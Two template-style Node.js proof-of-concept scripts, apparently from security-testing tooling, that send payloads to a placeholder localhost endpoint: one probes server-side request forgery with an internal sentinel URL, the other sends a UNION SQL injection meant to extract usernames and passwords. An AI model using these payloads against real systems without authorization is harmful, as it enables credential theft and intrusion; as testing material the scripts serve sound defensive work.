// Demonstrates SSRF by forcing the server to fetch a localhost sentinel URL.
// Endpoint:   POST http://localhost:3000/REPLACE-WITH-ENDPOINT
// Payload:    http://127.0.0.1:65533/poc-ssrf-sentinel
// Expect:     sentinel server logs a request from the target — proves the target made an outbound call we controlled
// Run:        node poc.mjs
// Exit code:  0 = exploit demonstrated, 1 = not demonstrated, 2 = error

const URL_ = "http://localhost:3000/REPLACE-WITH-ENDPOINT";
const METHOD = "POST";
const PAYLOAD = `http://127.0.0.1:65533/poc-ssrf-sentinel`;

const body = METHOD === 'GET'
  ? null
  : JSON.stringify({ "input": PAYLOAD });

const headers = { 'Content-Type': 'application/json' };

const reqUrl = METHOD === 'GET'
  ? URL_ + (URL_.includes('?') ? '&' : '?') + "input" + '=' + encodeURIComponent(PAYLOAD)
  : URL_;

try {
  const r = await fetch(reqUrl, { method: METHOD, headers, body, redirect: 'follow' });
  const text = await r.text();
  const sig = (text.includes("http://127.0.0.1:65533/poc-ssrf-sentinel") ? 'payload reflected' : '');
  if (sig) {
    process.stderr.write('PoC: exploit demonstrated — ' + sig + '\n');
    process.exit(0);
  }
  process.stderr.write('PoC: payload sent (status ' + r.status + '), no exploit evidence in response\n');
  process.exit(1);
} catch (e) {
  process.stderr.write('PoC: error reaching target — ' + e.message + '\n');
  process.exit(2);
}

// Demonstrates SQL injection by sending a UNION-style payload.
// Endpoint:   POST http://localhost:3000/REPLACE-WITH-ENDPOINT
// Payload:    ' UNION SELECT username, password FROM users--
// Expect:     response status 500 or body contains "syntax error" / leaked column / SQL stacktrace
// Run:        node poc.mjs
// Exit code:  0 = exploit demonstrated, 1 = not demonstrated, 2 = error

const URL_ = "http://localhost:3000/REPLACE-WITH-ENDPOINT";
const METHOD = "POST";
const PAYLOAD = `' UNION SELECT username, password FROM users--`;

const body = METHOD === 'GET'
  ? null
  : JSON.stringify({ "input": PAYLOAD });

const headers = { 'Content-Type': 'application/json' };

const reqUrl = METHOD === 'GET'
  ? URL_ + (URL_.includes('?') ? '&' : '?') + "input" + '=' + encodeURIComponent(PAYLOAD)
  : URL_;

try {
  const r = await fetch(reqUrl, { method: METHOD, headers, body, redirect: 'follow' });
  const text = await r.text();
  const sig = (/syntax error|psql|mysql|sqlite|near "/i.test(text) ? 'sql error reflected' : '');
  if (sig) {
    process.stderr.write('PoC: exploit demonstrated — ' + sig + '\n');
    process.exit(0);
  }
  process.stderr.write('PoC: payload sent (status ' + r.status + '), no exploit evidence in response\n');
  process.exit(1);
} catch (e) {
  process.stderr.write('PoC: error reaching target — ' + e.message + '\n');
  process.exit(2);
}

